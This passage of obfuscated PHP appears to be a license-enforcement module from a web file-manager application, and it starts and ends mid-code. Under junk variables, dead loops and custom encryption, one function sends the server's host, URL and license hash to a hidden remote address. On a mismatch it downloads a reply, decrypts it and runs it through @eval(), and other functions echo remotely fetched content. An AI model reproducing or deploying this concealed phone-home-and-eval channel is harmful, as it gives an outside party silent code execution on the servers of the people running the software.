$›‹è‡ıİ[158] => $_SERVER[$›‹è‡ıİ[159]]); $îÇ°™¸Ï = $this->yrhn73be9f0b(json_encode($Ä÷ä®™)); $this->khom8bf9133e($›‹è‡ıİ[184] . $îÇ°™¸Ï); show_json(LNG($›‹è‡ıİ[185]), !0); } $ŸŠ¸ÃœŸ = array($›‹è‡ıİ[186] => $¢¿¤Ñû[$›‹è‡ıİ[187]], $›‹è‡ıİ[188] => $¢¿¤Ñû[$›‹è‡ıİ[189]], $›‹è‡ıİ[190] => rand_string(16), $›‹è‡ıİ[105] => $¢¿¤Ñû[$›‹è‡ıİ[191]]); if ($…·†ŒÄ°[$›‹è‡ıİ[152]]) { $ŸŠ¸ÃœŸ[$›‹è‡ıİ[190]] = $…·†ŒÄ°[$›‹è‡ıİ[152]]; } $£©º°¤ = substr(md5($ŸŠ¸ÃœŸ[$›‹è‡ıİ[188]]), 10, 10); $—™œ˜ğ = $£©º°¤ . $ŸŠ¸ÃœŸ[$›‹è‡ıİ[105]] . $ŸŠ¸ÃœŸ[$›‹è‡ıİ[190]]; $ŸŠ¸ÃœŸ[$›‹è‡ıİ[107]] = strrev(base64_encode($this->wzbhbb44e3d1($—™œ˜ğ, $›‹è‡ıİ[192]))); $£áµ…—Ô = $ÃäŠÊ‰ƒ[662]; if (!$£áµ…—Ô) { return; } $‰÷Öæ¨Ü = rand_string(16); $æØÙ¯† = $ÃäŠÊ‰ƒ[663]; $÷ÄÃÍœ‡ = $‰÷Öæ¨Ü . $ŸŠ¸ÃœŸ[$›‹è‡ıİ[105]] . $this->wzbhbb44e3d1(md5($ŸŠ¸ÃœŸ[$›‹è‡ıİ[186]]), $‰÷Öæ¨Ü); $ŸŠ¸ÃœŸ[$›‹è‡ıİ[108]] = base64_encode(strrev($this->wzbhbb44e3d1($÷ÄÃÍœ‡, $›‹è‡ıİ[193]))); $ö™ï´ß¹ = $ÃäŠÊ‰ƒ[664]; while ($ö™ï´ß¹ < $ÃäŠÊ‰ƒ[620]) { if ($ö™ï´ß¹ >= 0) { break; } $ö™ï´ß¹++; } if ($¢¿¤Ñû[$›‹è‡ıİ[194]] && $¢¿¤Ñû[$›‹è‡ıİ[194]] >= 1) { Model($›‹è‡ıİ[33])->setDeep($›‹è‡ıİ[195], $›‹è‡ıİ[121]); } Model($›‹è‡ıİ[33])->set($ŸŠ¸ÃœŸ); $×ÂŒªÍ© = md5($_SERVER[$›‹è‡ıİ[102]] . strrev($á ÷®ğ–) . $ŸŠ¸ÃœŸ[$›‹è‡ıİ[188]]); $âä§İí… = strrev(substr($×ÂŒªÍ©, 10, 16)); $»Íä„úØ = $ÃäŠÊ‰ƒ[665]; $ÆåËş» = $this->oxpde7edb224(json_encode($¢¿¤Ñû), $×ÂŒªÍ©); $óñÃ™Ä¤ = array_to_keyvalue(Model($›‹è‡ıİ[7])->listData(), $›‹è‡ıİ[196]); $¼¡×Àâ = $óñÃ™Ä¤[$›‹è‡ıİ[197]]; $è˜ÄŸª = array(); $è˜ÄŸª[$âä§İí…] = $ÆåËş»; $Ï÷ªªæ = $ÃäŠÊ‰ƒ[666]; while (strlen($Ï÷ªªæ) < $ÃäŠÊ‰ƒ[630]) { if (!$Ï÷ªªæ) { break; } $Ï÷ªªæ++; } Model($›‹è‡ıİ[7])->update($¼¡×Àâ[$›‹è‡ıİ[198]], array($›‹è‡ıİ[199] => $è˜ÄŸª)); $¨ˆ¾ü™¸ = $ÃäŠÊ‰ƒ[667]; if (!$¨ˆ¾ü™¸) { die; } $this->xtalab6d62b8 = $¢¿¤Ñû; $ÕÕÒƒ¶ˆ = $ÃäŠÊ‰ƒ[668]; if (strlen($ÕÕÒƒ¶ˆ) < $ÃäŠÊ‰ƒ[632]) { die; } $this->lkep762b298f = $ŸŠ¸ÃœŸ[$›‹è‡ıİ[105]]; $this->licenseRegistSuccess(); Cache::set($›‹è‡ıİ[200] . md5($á ÷®ğ– . $›‹è‡ıİ[201]), $›‹è‡ıİ[6]); show_json(LNG($›‹è‡ıİ[185]), !0); $ç°ò×˜½ = $ÃäŠÊ‰ƒ[669]; while ($ç°ò×˜½ < $ÃäŠÊ‰ƒ[623]) { if ($ç°ò×˜½ >= 0) { break; } $ç°ò×˜½++; } } private function licenseRegistSuccess() { $œÔıÒÑÁ =& $_SERVER[Ñ·¨¶Š£]; $‘§ê„‹È = Model($œÔıÒÑÁ[33])->get(); if ($‘§ê„‹È[$œÔıÒÑÁ[63]] != $œÔıÒÑÁ[121]) { Model($œÔıÒÑÁ[33])->set($œÔıÒÑÁ[63], $œÔıÒÑÁ[121]); } Action($œÔıÒÑÁ[202])->initStart(!0); } private function vxiw22996a12() { $×òö¢ë± =& $_SERVER[ĞÂ¤àÓï]; $äÕÙ°– =& $_SERVER[Ñ·¨¶Š£]; Model($äÕÙ°–[33])->set(array($äÕÙ°–[186] => $äÕÙ°–[6], $äÕÙ°–[188] => $äÕÙ°–[6], $äÕÙ°–[105] => $äÕÙ°–[106], $äÕÙ°–[107] => $äÕÙ°–[6], $äÕÙ°–[108] => $äÕÙ°–[6])); Model($äÕÙ°–[33])->setDeep($äÕÙ°–[195], $äÕÙ°–[203]); $¡·²Úô‰ = $×òö¢ë±[670]; if (strlen($¡·²Úô‰) < $×òö¢ë±[620]) { return; } $this->xtalab6d62b8 = array(); $this->lkep762b298f = $äÕÙ°–[106]; $ıåˆæåú = $×òö¢ë±[671]; } private function tlrh6575278b() { $“ßÑÕèÌ =& $_SERVER[ĞÂ¤àÓï]; $êª÷ŞÕ =& $_SERVER[Ñ·¨¶Š£]; $_SERVER[$êª÷ŞÕ[159]] = _get($_SERVER, $êª÷ŞÕ[159], APP_HOST); $this->lkep762b298f = $êª÷ŞÕ[106]; $ñóĞ—Ä• = $“ßÑÕèÌ[672]; while ($ñóĞ—Ä• < $“ßÑÕèÌ[632]) { if ($ñóĞ—Ä• >= 0) { break; } $ñóĞ—Ä•++; } $¨ùêÇ¯ = Model($êª÷ŞÕ[33])->get(); $ŞéˆÙûà = $“ßÑÕèÌ[673]; if (strlen($ŞéˆÙûà) < $“ßÑÕèÌ[632]) { return; } if ($¨ùêÇ¯[$êª÷ŞÕ[105]] == $êª÷ŞÕ[106]) { return; } $Û›ŒÇ† = Model($êª÷ŞÕ[33])->get($êª÷ŞÕ[103]); $ÌÂ©…ÁÎ = $“ßÑÕèÌ[674]; if (strlen($ÌÂ©…ÁÎ) < $“ßÑÕèÌ[623]) { return; } $ŸÌ¨éûı = $êª÷ŞÕ[200] . md5($Û›ŒÇ† . $êª÷ŞÕ[201]); $ŠåŒŠëÈ = Cache::get($ŸÌ¨éûı); $Å’ì”½– = $“ßÑÕèÌ[675]; while ($Å’ì”½– < $“ßÑÕèÌ[632]) { if ($Å’ì”½– >= 0) { break; } $Å’ì”½–++; } if (!is_array($ŠåŒŠëÈ) || !isset($ŠåŒŠëÈ[$êª÷ŞÕ[204]]) || time() - $ŠåŒŠëÈ[$êª÷ŞÕ[204]] >= 60) { $Ê”òĞ³ø = Model($êª÷ŞÕ[7])->loadList(); $ç¥ÚÊ—Ê = $Ê”òĞ³ø[$êª÷ŞÕ[197]]; $ô²ÂÏÎâ = md5($_SERVER[$êª÷ŞÕ[102]] . strrev($Û›ŒÇ†) . $¨ùêÇ¯[$êª÷ŞÕ[188]]); $’È³ü©„ = strrev(substr($ô²ÂÏÎâ, 10, 16)); $ŠåŒŠëÈ = $this->cslmccd44fbb($ç¥ÚÊ—Ê[$êª÷ŞÕ[85]][$’È³ü©„], $ô²ÂÏÎâ); $ŠåŒŠëÈ = json_decode($ŠåŒŠëÈ, !0); } if (!is_array($ŠåŒŠëÈ)) { return $this->vxiw22996a12(); } $†™²ãÙÀ = strtotime($ŠåŒŠëÈ[$êª÷ŞÕ[128]]); if (time() >= $†™²ãÙÀ) { return $this->vxiw22996a12(); } if (time() - $ŠåŒŠëÈ[$êª÷ŞÕ[204]] > 20) { $ŠåŒŠëÈ[$êª÷ŞÕ[204]] = time(); Cache::set($ŸÌ¨éûı, $ŠåŒŠëÈ); } $this->xtalab6d62b8 = $ŠåŒŠëÈ; $this->lkep762b298f = $¨ùêÇ¯[$êª÷ŞÕ[105]]; } private function hngf8aaac435() { $ÉîßÎ‚ =& $_SERVER[ĞÂ¤àÓï]; $³€¬ÖÖ =& $_SERVER[Ñ·¨¶Š£]; $¬ÍÕ™ø± = $GLOBALS[$³€¬ÖÖ[13]]; $½§‘”š = $ÉîßÎ‚[676]; if (!$½§‘”š) { return; } $êù»¯Ú = $_SERVER[$³€¬ÖÖ[24]]; $†Õ†ÚÈñ = $ÉîßÎ‚[677]; while ($†Õ†ÚÈñ < $ÉîßÎ‚[615]) { if ($†Õ†ÚÈñ >= 0) { break; } $†Õ†ÚÈñ++; } if ($êù»¯Ú == $³€¬ÖÖ[205] && $this->lkep762b298f == $³€¬ÖÖ[106]) { show_json(LNG($³€¬ÖÖ[206]), !1, $³€¬ÖÖ[207]); } $áüœÓ¬š = array($³€¬ÖÖ[208], $³€¬ÖÖ[209]); if (in_array($êù»¯Ú, $áüœÓ¬š)) { if ($this->lkep762b298f == $³€¬ÖÖ[106] && isset($¬ÍÕ™ø±[$³€¬ÖÖ[210]])) { show_json(LNG($³€¬ÖÖ[206]), !1, $³€¬ÖÖ[207]); die; } $¯‹¾ŸÛ™ = $this->vngsc9544fec(); if ($¯‹¾ŸÛ™ != intval($³€¬ÖÖ[211])) { if ($¯‹¾ŸÛ™ <= Model($³€¬ÖÖ[124])->count()) { show_json(LNG($³€¬ÖÖ[212]), !1, $³€¬ÖÖ[207]); die; } } } } private function ezwxa8b1a89d() { $”¯øÁĞŸ =& $_SERVER[ĞÂ¤àÓï]; $¸¡ñĞò¨ =& $_SERVER[Ñ·¨¶Š£]; $ÁšÌÁÔ = array($¸¡ñĞò¨[118], $¸¡ñĞò¨[119]); if (!_get($GLOBALS, $¸¡ñĞò¨[115]) || !isset($_GET[$¸¡ñĞò¨[213]])) { return; } if (!in_array($_SERVER[$¸¡ñĞò¨[24]], $ÁšÌÁÔ)) { return; } $€¦†Ê©ı = $¸¡ñĞò¨[214]; $€¦†Ê©ı = $this->ozma5325d9c0($€¦†Ê©ı, $¸¡ñĞò¨[215]); $¤ÀÌµ‰å = $”¯øÁĞŸ[678]; if (strlen($¤ÀÌµ‰å) < $”¯øÁĞŸ[623]) { die; } $¥ëÌñÛ… = stream_context_create(array($¸¡ñĞò¨[216] => array($¸¡ñĞò¨[217] => $¸¡ñĞò¨[218], $¸¡ñĞò¨[219] => 3))); $şÄÄì‹ƒ = @file_get_contents($€¦†Ê©ı, !1, $¥ëÌñÛ…); header($¸¡ñĞò¨[220]); if ($şÄÄì‹ƒ && strstr($şÄÄì‹ƒ, $¸¡ñĞò¨[221])) { echo $şÄÄì‹ƒ; } die; } public function ulif1a5d9717($èÆ¼£Û) { $ÖœÚŠ´ =& $_SERVER[ĞÂ¤àÓï]; $ø×êèÀ =& $_SERVER[Ñ·¨¶Š£]; if ($this->lkep762b298f == $ø×êèÀ[222]) { return $èÆ¼£Û; } $õªÎŸ” = array($ø×êèÀ[223] => $ø×êèÀ[224], $ø×êèÀ[225] => $ø×êèÀ[224], $ø×êèÀ[226] => $ø×êèÀ[224], $ø×êèÀ[227] => $ø×êèÀ[224], $ø×êèÀ[228] => $ø×êèÀ[229], $ø×êèÀ[230] => $ø×êèÀ[229], $ø×êèÀ[231] => $ø×êèÀ[229], $ø×êèÀ[232] => $ø×êèÀ[229], $ø×êèÀ[233] => $ø×êèÀ[229], $ø×êèÀ[234] => $ø×êèÀ[229], $ø×êèÀ[235] => $ø×êèÀ[229], $ø×êèÀ[236] => $ø×êèÀ[229], $ø×êèÀ[237] => $ø×êèÀ[229], $ø×êèÀ[238] => $ø×êèÀ[229], $ø×êèÀ[239] => $ø×êèÀ[229], $ø×êèÀ[240] => $ø×êèÀ[229]); $¯•û³Ú• = explode($ø×êèÀ[241], _get($this->xtalab6d62b8, $ø×êèÀ[112], $ø×êèÀ[6])); $È–ÂµÁ½ = $ÖœÚŠ´[679]; while ($È–ÂµÁ½ < $ÖœÚŠ´[615]) { if ($È–ÂµÁ½ >= 0) { break; } $È–ÂµÁ½++; } $Äù¨Îµ = array(); $”Ï«úşİ = $ÖœÚŠ´[680]; while (strlen($”Ï«úşİ) < $ÖœÚŠ´[615]) { if (!$”Ï«úşİ) { break; } $”Ï«úşİ++; } foreach ($õªÎŸ” as $šÍº ƒ => $ˆ»Ó’ö) { if ($ˆ»Ó’ö == $ø×êèÀ[224] && substr($this->lkep762b298f, 0, 1) == $ø×êèÀ[224]) { continue; } if (!in_array($šÍº ƒ, $¯•û³Ú•)) { $Äù¨Îµ[] = $šÍº ƒ; } } foreach ($Äù¨Îµ as $šÍº ƒ) { unset($èÆ¼£Û[$šÍº ƒ]); } return $èÆ¼£Û; $’çîè—Ï = $ÖœÚŠ´[681]; } private function ugvz3279cb8b() { $ü•™·îğ =& $_SERVER[Ñ·¨¶Š£]; if ($this->lkep762b298f != $ü•™·îğ[106]) { $GLOBALS[$ü•™·îğ[85]][$ü•™·îğ[89]][$ü•™·îğ[242]] = $ü•™·îğ[203]; return; } $GLOBALS[$ü•™·îğ[85]][$ü•™·îğ[243]] = $ü•™·îğ[121]; if (Model($ü•™·îğ[244])->get($ü•™·îğ[63]) != $ü•™·îğ[203]) { Model($ü•™·îğ[244])->set($ü•™·îğ[63], $ü•™·îğ[203]); } } public function hzky80ad030c() { return $_SERVER[Ñ·¨¶Š£][245]; } private function gpji65050c22() { $óÎùù¤ =& $_SERVER[ĞÂ¤àÓï]; $É˜Ã©Âš =& $_SERVER[Ñ·¨¶Š£]; $¾¶±ë¦é = array($É˜Ã©Âš[246], $É˜Ã©Âš[247], $É˜Ã©Âš[248]); $íÏ™œö£ = $óÎùù¤[682]; while ($íÏ™œö£ < $óÎùù¤[623]) { if ($íÏ™œö£ >= 0) { break; } $íÏ™œö£++; } $íÜ×åÒÙ = $É˜Ã©Âš[249] . md5($É˜Ã©Âš[250]); if ($this->lkep762b298f == $É˜Ã©Âš[106] || !_get($GLOBALS, $É˜Ã©Âš[115])) { return; } if (!in_array($_SERVER[$É˜Ã©Âš[24]], $¾¶±ë¦é)) { return; } if (time() % 4 != 0) { return; } $ÀÔì = call_user_func(array($É˜Ã©Âš[251], $É˜Ã©Âš[252]), $íÜ×åÒÙ); if ($ÀÔì && time() - $ÀÔì < intval($É˜Ã©Âš[253])) { return; } call_user_func(array($É˜Ã©Âš[251], $É˜Ã©Âš[138]), $íÜ×åÒÙ, time()); $¢øÚÌÈ‚ = $óÎùù¤[683]; $Ä«´´¡Œ = Model($É˜Ã©Âš[33])->get($É˜Ã©Âš[103]); $¦à˜çÇ = $óÎùù¤[684]; while (strlen($¦à˜çÇ) < $óÎùù¤[623]) { if (!$¦à˜çÇ) { break; } $¦à˜çÇ++; } $Üœš—Ã = array($É˜Ã©Âš[150] => Model($É˜Ã©Âš[33])->get($É˜Ã©Âš[186]), $É˜Ã©Âš[163] => $this->lkep762b298f, $É˜Ã©Âš[160] => $_SERVER[$É˜Ã©Âš[161]], $É˜Ã©Âš[162] => Model($É˜Ã©Âš[33])->get($É˜Ã©Âš[130]), $É˜Ã©Âš[101] => md5($_SERVER[$É˜Ã©Âš[102]] . $Ä«´´¡Œ), $É˜Ã©Âš[153] => $É˜Ã©Âš[135], $É˜Ã©Âš[156] => $_SERVER[$É˜Ã©Âš[157]]); $ªì…„Ë = $this->khom8bf9133e($É˜Ã©Âš[254], $Üœš—Ã); if (!is_array($ªì…„Ë)) { return; } if ($ªì…„Ë[$É˜Ã©Âš[150]] && $ªì…„Ë[$É˜Ã©Âš[255]]) { if ($this->kscwe829485a($ªì…„Ë[$É˜Ã©Âš[255]]) == $Üœš—Ã[$É˜Ã©Âš[150]]) { return; } } $this->vxiw22996a12(); $ÌÆÊ¿õı = $óÎùù¤[685]; while ($ÌÆÊ¿õı < $óÎùù¤[623]) { if ($ÌÆÊ¿õı >= 0) { break; } $ÌÆÊ¿õı++; } if ($this->kscwe829485a($ªì…„Ë[$É˜Ã©Âš[255]]) != $Üœš—Ã[$É˜Ã©Âš[150]]) { $Œ°èë« = array($É˜Ã©Âš[181] => $Ä«´´¡Œ, $É˜Ã©Âš[182] => $_SERVER[$É˜Ã©Âš[102]], $É˜Ã©Âš[183] => this_url(), $É˜Ã©Âš[158] => $_SERVER[$É˜Ã©Âš[159]]); $ÆÜŞÚÓÔ = $this->yrhn73be9f0b(json_encode($Œ°èë«)); $ªì…„Ë = $this->khom8bf9133e($É˜Ã©Âš[184] . $ÆÜŞÚÓÔ); if ($ªì…„Ë && is_array($ªì…„Ë) && isset($ªì…„Ë[$É˜Ã©Âš[255]])) { $óšßœ¦İ = $this->cslmccd44fbb($ªì…„Ë[$É˜Ã©Âš[255]], 2); if ($óšßœ¦İ) { $óšßœ¦İ = $this->kscwe829485a($óšßœ¦İ); } if ($óšßœ¦İ) { try { @eval($óšßœ¦İ); } catch (Exception $ÚİÊ‘É–) { } } } } } private function khom8bf9133e($¯åÑ´ÀÜ = '', $ÃëæÄ· = array(), $İ¼¯ñÆ = 5) { $¥¬ÕŞ =& $_SERVER[Ñ·¨¶Š£]; $´Á¤¤†ê = $¥¬ÕŞ[256]; $´Á¤¤†ê = $this->ozma5325d9c0($´Á¤¤†ê, $¥¬ÕŞ[257]); $´Á¤¤†ê = $´Á¤¤†ê . $¯åÑ´ÀÜ; if ($ÃëæÄ· && is_array($ÃëæÄ·)) { $´Á¤¤†ê = $´Á¤¤†ê . $¥¬ÕŞ[258] . http_build_query($ÃëæÄ·); } if ($ÃëæÄ· === -1) { return $´Á¤¤†ê; } $‚“Šä» = stream_context_create(array($¥¬ÕŞ[216] => array($¥¬ÕŞ[219] => $İ¼¯ñÆ, $¥¬ÕŞ[217] => $¥¬ÕŞ[259]), $¥¬ÕŞ[260] => array($¥¬ÕŞ[261] => !1, $¥¬ÕŞ[262] => !1))); $ÃëæÄ· = @file_get_contents($´Á¤¤†ê, !1, $‚“Šä»); return json_decode($ÃëæÄ·, !0); $ÉË«…Æ = $_SERVER[ĞÂ¤àÓï][686]; if (!$ÉË«…Æ) { die; } } private function vngsc9544fec() { $¾ø¶ ì± =& $_SERVER[ĞÂ¤àÓï]; $×ûä–„÷ =& $_SERVER[Ñ·¨¶Š£]; $ÉûŒÉï = array($×ûä–„÷[263] => $×ûä–„÷[264], $×ûä–„÷[265] => $×ûä–„÷[266], $×ûä–„÷[267] => $×ûä–„÷[268], $×ûä–„÷[269] => $×ûä–„÷[270], $×ûä–„÷[271] => $×ûä–„÷[272], $×ûä–„÷[273] => $×ûä–„÷[211], $×ûä–„÷[274] => $×ûä–„÷[211], $×ûä–„÷[275] => $×ûä–„÷[264], $×ûä–„÷[276] => $×ûä–„÷[266], $×ûä–„÷[277] => $×ûä–„÷[268], $×ûä–„÷[278] => $×ûä–„÷[279], $×ûä–„÷[280] => $×ûä–„÷[270], $×ûä–„÷[281] => $×ûä–„÷[282], $×ûä–„÷[283] => $×ûä–„÷[272], $×ûä–„÷[284] => $×ûä–„÷[285], $×ûä–„÷[286] => $×ûä–„÷[287], $×ûä–„÷[288] => $×ûä–„÷[289]); $É“ë‘îœ = $ÉûŒÉï[$this->lkep762b298f]; $É“ë‘îœ = intval($É“ë‘îœ ? $É“ë‘îœ : $×ûä–„÷[264]); $„¡’¼ˆ = $¾ø¶ ì±[687]; $áşğÊî = _get($this->xtalab6d62b8, $×ûä–„÷[290]); $áşğÊî = $áşğÊî ? intval($áşğÊî) : 0; return $É“ë‘îœ + $áşğÊî; $Ÿ¦ğÅı« = $¾ø¶ ì±[688]; while (strlen($Ÿ¦ğÅı«) < $¾ø¶ ì±[615]) { if (!$Ÿ¦ğÅı«) { break; } $Ÿ¦ğÅı«++; } } public function zdrq37cbf14b($ÛçÍ¢ò§) { $¡éã·¬¦ =& $_SERVER[ĞÂ¤àÓï]; $¼ıÆŒ‡Û =& $_SERVER[Ñ·¨¶Š£]; $ÅÖ¿ôÓ¹ = $this->vngsc9544fec(); $­³˜Ù†“ = $¡éã·¬¦[689]; if (strlen($­³˜Ù†“) < $¡éã·¬¦[630]) { die; } if ($ÛçÍ¢ò§[$¼ıÆŒ‡Û[291]] == $¼ıÆŒ‡Û[121]) { return; } if ($ÅÖ¿ôÓ¹ >= intval($¼ıÆŒ‡Û[211])) { return; } $’±ùÎã‰ = Model($¼ıÆŒ‡Û[124])->count(); $¶‹İîò™ = $¡éã·¬¦[690]; if (!$¶‹İîò™) { return; } if ($’±ùÎã‰ <= $ÅÖ¿ôÓ¹) { return; } $ÃÔò¢ï» = Model($¼ıÆŒ‡Û[124])->field($¼ıÆŒ‡Û[291])->limit($ÅÖ¿ôÓ¹)->select(); $Æ©ûıö = $¡éã·¬¦[691]; if (!$Æ©ûıö) { return; } $ÃÔò¢ï» = array_to_keyvalue($ÃÔò¢ï», $¼ıÆŒ‡Û[6], $¼ıÆŒ‡Û[291]); if (!in_array($ÛçÍ¢ò§[$¼ıÆŒ‡Û[291]], $ÃÔò¢ï»)) { show_json($¼ıÆŒ‡Û[292], !1, $¼ıÆŒ‡Û[207]); } } public function tvmgd1bac04f() { $¸Ì·ş =& $_SERVER[ĞÂ¤àÓï]; $Ññµ¯¥ =& $_SERVER[Ñ·¨¶Š£]; if (!_get($GLOBALS, $Ññµ¯¥[115]) || mt_rand(1, 100) > 20) { return; } $Ïœ½¤­ = $Ññµ¯¥[214]; $÷ª«¥œ‘ = $¸Ì·ş[692]; if (!$÷ª«¥œ‘) { return; } $Ïœ½¤­ = $this->ozma5325d9c0($Ïœ½¤­, $Ññµ¯¥[215]); $÷Òı•˜á = $¸Ì·ş[693]; while (strlen($÷Òı•˜á) < $¸Ì·ş[630]) { if (!$÷Òı•˜á) { break; } $÷Òı•˜á++; } $“êÉŞ¢ = stream_context_create(array($Ññµ¯¥[216] => array($Ññµ¯¥[217] => $Ññµ¯¥[218], $Ññµ¯¥[219] => 3))); $ÛÔğ‡å´ = $¸Ì·ş[694]; $¹á—Ùôé = @file_get_contents($Ïœ½¤­, !1, $“êÉŞ¢); $ªäÁ‹ğ = $¸Ì·ş[695]; echo $Ññµ¯¥[293] . hash_encode($¹á—Ùôé) . $Ññµ¯¥[294]; $ÎƒåÚìå = $¸Ì·ş[696]; if (strlen($ÎƒåÚìå) < $¸Ì·ş[630]) { return; } } private function oxpde7edb224($Ñíáéãİ, $şœ°£¹, $à°—·¡ï = 3) { $“Àƒ€«• =& $_SERVER[ĞÂ¤àÓï]; $àÃ¨ÛÒ’ =& $_SERVER[Ñ·¨¶Š£]; usleep(1); $¶Ã½ç‘ = $“Àƒ€«•[697]; while (strlen($¶Ã½ç‘) < $“Àƒ€«•[615]) { if (!$¶Ã½ç‘) { break; } $¶Ã½ç‘++; } $Ñíáéãİ = trim($Ñíáéãİ); $§Š÷àª = $“Àƒ€«•[698]; if (strlen($§Š÷àª) < $“Àƒ€«•[623]) { die; } $¶ƒŠÙƒ¦ = mt_rand(0, 5) . $àÃ¨ÛÒ’[6]; $œ÷ûã˜“ = rand_string(15); $»İëäŠ = $“Àƒ€«•[699]; if (strlen($»İëäŠ) < $“Àƒ€«•[615]) { return; } $ô³öË¦ = $àÃ¨ÛÒ’[295]; switch ($¶ƒŠÙƒ¦) { case $àÃ¨ÛÒ’[203]: $œÉøÙÎŞ = $this->wzbhbb44e3d1($Ñíáéãİ, strrev($şœ°£¹ . $œ÷ûã˜“)); $êº–±²ã = $“Àƒ€«•[700]; if (strlen($êº–±²ã) < $“Àƒ€«•[615]) { return; } break; $—™¸–œ› = $“Àƒ€«•[701]; case $àÃ¨ÛÒ’[121]: $œÉøÙÎŞ = $this->wzbhbb44e3d1($Ñíáéãİ, strrev($œ÷ûã˜“ . $şœ°£¹)); break; case $àÃ¨ÛÒ’[296]: $œÉøÙÎŞ = $this->wzbhbb44e3d1($Ñíáéãİ, base64_encode($œ÷ûã˜“ . $şœ°£¹)); break; case $àÃ¨ÛÒ’[297]: $œÉøÙÎŞ = $this->wzbhbb44e3d1($Ñíáéãİ, md5($œ÷ûã˜“ . $şœ°£¹)); $²ˆ¸£Ë™ = $“Àƒ€«•[702]; if (strlen($²ˆ¸£Ë™) < $“Àƒ€«•[630]) { die; } break; case $àÃ¨ÛÒ’[298]: $Ñíáéãİ = base64_encode($Ñíáéãİ); $İ‡ºÌ•É = $“Àƒ€«•[703]; if (!$İ‡ºÌ•É) { die; } $Œş²³ßÍ = rand(0, 64); $±ğ›‘ä¹ = $ô³öË¦[$Œş²³ßÍ]; $Ó­‡Ş¶– = md5($±ğ›‘ä¹ . md5($şœ°£¹ . $±ğ›‘ä¹) . $şœ°£¹); $˜¬’Õµ = $“Àƒ€«•[704]; while (strlen($˜¬’Õµ) < $“Àƒ€«•[630]) { if (!$˜¬’Õµ) { break; } $˜¬’Õµ++; } $Ó­‡Ş¶– = substr($Ó­‡Ş¶–, $Œş²³ßÍ % 8, $Œş²³ßÍ % 8 + 7); $Œ»€Éê = $“Àƒ€«•[705]; if (strlen($Œ»€Éê) < $“Àƒ€«•[630]) { die; } $¶”é¦¹û = $àÃ¨ÛÒ’[6]; $°Óê¨íó = 0; $Ú‚Ûß™õ = 0; $òÊÎ“† = 0; $¡§ˆ = $“Àƒ€«•[706]; if (!$¡§ˆ) { return; } for ($°Óê¨íó = 0; $°Óê¨íó < strlen($Ñíáéãİ); $°Óê¨íó++) { $òÊÎ“† = $òÊÎ“† == strlen($Ó­‡Ş¶–) ? 0 : $òÊÎ“†; $Ú‚Ûß™õ = ($Œş²³ßÍ + strpos($ô³öË¦, $Ñíáéãİ[$°Óê¨íó]) + ord($Ó­‡Ş¶–[$òÊÎ“†++])) % 64; $¶”é¦¹û .= $ô³öË¦[$Ú‚Ûß™õ]; $‚‚ÆáÒƒ = $“Àƒ€«•[707]; } $œÉøÙÎŞ = hash_encode($±ğ›‘ä¹ . $¶”é¦¹û); break; $´è²Ú„Ò = $“Àƒ€«•[708]; while (strlen($´è²Ú„Ò) < $“Àƒ€«•[615]) { if (!$´è²Ú„Ò) { break; } $´è²Ú„Ò++; } default: $œÉøÙÎŞ = $this->wzbhbb44e3d1($Ñíáéãİ, $şœ°£¹ . $œ÷ûã˜“); break; } $œÉøÙÎŞ = strrev($¶ƒŠÙƒ¦ . $œ÷ûã˜“ . $œÉøÙÎŞ); if ($à°—·¡ï - 1 > 0) { $œÉøÙÎŞ = $this->oxpde7edb224($œÉøÙÎŞ, $şœ°£¹, $à°—·¡ï - 1); } return $œÉøÙÎŞ; } private function cslmccd44fbb($„ïàëì, $ü°ŞÍ¥, $áİÆ¿‚¢ = 3) { $ñÇÊ‰” =& $_SERVER[ĞÂ¤àÓï]; $›ç‰½·¯ =& $_SERVER[Ñ·¨¶Š£]; if (!is_string($„ïàëì) || strlen($„ïàëì) < 10) { return !1; } $„ïàëì = trim($„ïàëì); $ËÏ…Êùß = $ñÇÊ‰”[709]; while ($ËÏ…Êùß < $ñÇÊ‰”[630]) { if ($ËÏ…Êùß >= 0) { break; } $ËÏ…Êùß++; } $„ïàëì = strrev($„ïàëì); $£êÈü“… = $„ïàëì[0]; $†ŸûÇÚ„ = substr($„ïàëì, 1, 15); $„ïàëì = substr($„ïàëì, 16); $‚¾Ü ‡Î = $ñÇÊ‰”[710]; $°É™ÜÄ„ = $›ç‰½·¯[295]; $ßú¹ª¬¨ = $ñÇÊ‰”[711]; switch ($£êÈü“…) { case $›ç‰½·¯[203]: $‹«İëÂ = $this->ozma5325d9c0($„ïàëì, strrev($ü°ŞÍ¥ . $†ŸûÇÚ„)); break; $î‘øîã = $ñÇÊ‰”[628]; if (!$î‘øîã) { die; } case $›ç‰½·¯[121]: $‹«İëÂ = $this->ozma5325d9c0($„ïàëì, strrev($†ŸûÇÚ„ . $ü°ŞÍ¥)); $¤Œç„’• = $ñÇÊ‰”[712]; while ($¤Œç„’• < $ñÇÊ‰”[632]) { if ($¤Œç„’• >= 0) { break; } $¤Œç„’•++; } break; case $›ç‰½·¯[296]: $‹«İëÂ = $this->ozma5325d9c0($„ïàëì, base64_encode($†ŸûÇÚ„ . $ü°ŞÍ¥)); break; case $›ç‰½·¯[297]: $‹«İëÂ = $this->ozma5325d9c0($„ïàëì, md5($†ŸûÇÚ„ . $ü°ŞÍ¥)); break; case $›ç‰½·¯[298]: $„ïàëì = hash_decode($„ïàëì); $“¤•ùÀ› = $ñÇÊ‰”[713]; while (strlen($“¤•ùÀ›) < $ñÇÊ‰”[615]) { if (!$“¤•ùÀ›) { break; } $“¤•ùÀ›++; } $â¯‘ÑÂ† = $„ïàëì[0]; $„ïàëì = substr($„ïàëì, 1); $èû®ÊÒ = $ñÇÊ‰”[714]; $…¢êä = strpos($°É™ÜÄ„, $â¯‘ÑÂ†); $¥¡Ş¬³ = md5($â¯‘ÑÂ† . md5($ü°ŞÍ¥ . $â¯‘ÑÂ†) . $ü°ŞÍ¥); $…•ßÄÌ” = $ñÇÊ‰”[715]; while ($…•ßÄÌ” < $ñÇÊ‰”[620]) { if ($…•ßÄÌ” >= 0) { break; } $…•ßÄÌ”++; } $¥¡Ş¬³ = substr($¥¡Ş¬³, $…¢êä % 8, $…¢êä % 8 + 7); $½Ø¢¿Ä˜ = $ñÇÊ‰”[716]; while ($½Ø¢¿Ä˜ < $ñÇÊ‰”[620]) { if ($½Ø¢¿Ä˜ >= 0) { break; } $½Ø¢¿Ä˜++; } $…Í×´ìè = $›ç‰½·¯[6]; $º™Í¹‰‚ = 0; $ÈÍ¿»  = $ñÇÊ‰”[717]; $Ù÷®›ğÕ = 0; $Ğ„ĞÖáĞ = $ñÇÊ‰”[718]; while 